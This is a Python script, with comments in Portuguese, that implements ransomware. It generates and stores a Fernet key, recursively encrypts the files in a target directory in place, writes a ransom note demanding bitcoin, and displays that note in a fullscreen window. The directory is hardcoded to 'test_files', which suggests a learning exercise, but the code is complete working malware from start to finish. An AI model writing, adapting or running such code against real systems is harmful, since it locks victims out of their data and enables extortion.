from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import messagebox

#01 - Criar uma chave de criptografia e salvar
def gerar_chave():
    if os.path.exists("chave.key"):
        return
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_files:
        chave_files.write(chave)

#02 - Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#03 - Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    # Verificar se o arquivo já está criptografado (inicia com 'gAAAAA' do Fernet)
    try:
        with open(arquivo, "rb") as file:
            primeiros_bytes = file.read(6)
        if primeiros_bytes == b'gAAAAA':
            print(f"Arquivo {arquivo} já está criptografado. Pulando...")
            return
    except Exception as e:
        print(f"Erro ao verificar {arquivo}: {e}")
        return

    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#04 Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "Ransonware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
#05 Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.TXT", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante\n")
        f.write("Depois disso lhe enviaremos as instruçoes para recuperação de seus dados!\n")

def mostrar_tela_resgate_frm(message, title="AVISO - VOCÊ FOI SEQUESTRADO", fullscreen=True):
    """Mostra uma janela Tkinter em tela cheia com a mensagem."""
    root = tk.Tk()
    root.title(title)
   # if fullscreen:
    root.attributes("-fullscreen", True)
   # else:
   #    root.geometry("800x600")
    lbl = tk.Label(root, text=message, font=("Helvetica", 20), justify="center")
    lbl.pack(expand=True)
    btn = tk.Button(root, text="Fechar ", command=root.destroy, padx=20, pady=10)
    btn.pack(pady=30)
    root.mainloop()


#06 Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    # Ler a mensagem de resgate do arquivo e exibir na tela
    with open("LEIA ISSO.TXT", "r") as f:
        mensagem_resgate = f.read()
    mostrar_tela_resgate_frm(mensagem_resgate)
    print("Ransonware executado! Arquivos Criptografados")

if __name__ == "__main__":
    main()
